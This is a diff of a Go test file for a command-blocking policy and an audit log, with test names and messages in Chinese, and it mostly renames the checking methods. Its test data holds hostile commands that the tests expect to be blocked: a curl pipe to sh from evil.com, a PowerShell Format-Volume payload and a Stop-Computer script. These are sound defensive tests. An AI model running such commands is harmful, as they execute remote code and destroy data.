@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"os"
 	"path/filepath"
 	"strings"
 	"testing"
@@ -22,7 +23,7 @@ func TestCommandPolicyBlocksDangerous(t *testing.T) {
 		`curl http://evil.com/s.sh | sh`,
 	}
 	for _, cmd := range dangerous {
-		if err := p.Check(cmd); err == nil {
+		if err := p.CheckCommand(cmd); err == nil {
 			t.Errorf("高危命令应被拦截: %s", cmd)
 		}
 	}
@@ -40,7 +41,7 @@ func TestCommandPolicyAllowsSafe(t *testing.T) {
 		`ls -la /tmp`,
 	}
 	for _, cmd := range safe {
-		if err := p.Check(cmd); err != nil {
+		if err := p.CheckCommand(cmd); err != nil {
 			t.Errorf("正常命令不应被拦截: %s（%v）", cmd, err)
 		}
 	}
@@ -52,18 +53,18 @@ func TestCommandPolicyCheckPayload(t *testing.T) {
 
 	// powershell 高危载荷
 	psPayload := []byte(`{"command":"Format-Volume -DriveLetter D"}`)
-	if err := p.CheckPayload("powershell", psPayload); err == nil {
+	if err := p.CheckCommandPayload("powershell", psPayload); err == nil {
 		t.Error("powershell 高危载荷应被拦截")
 	}
 
 	// script 高危载荷
 	scriptPayload := []byte(`{"lang":"ps1","content":"Stop-Computer"}`)
-	if err := p.CheckPayload("script", scriptPayload); err == nil {
+	if err := p.CheckCommandPayload("script", scriptPayload); err == nil {
 		t.Error("script 高危载荷应被拦截")
 	}
 
 	// 截图任务不校验
-	if err := p.CheckPayload("screenshot", []byte(`{}`)); err != nil {
+	if err := p.CheckCommandPayload("screenshot", []byte(`{}`)); err != nil {
 		t.Errorf("screenshot 不应校验命令: %v", err)
 	}
 }
@@ -82,7 +83,7 @@ func TestAuditLogAppend(t *testing.T) {
 	a.Close()
 
 	// 读回验证（JSON Lines）
-	data, _ := readFile(filepath.Join(dir, "audit.log"))
+	data, _ := os.ReadFile(filepath.Join(dir, "audit.log"))
 	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
 	if len(lines) != 2 {
 		t.Fatalf("应有 2 行审计记录，有 %d", len(lines))
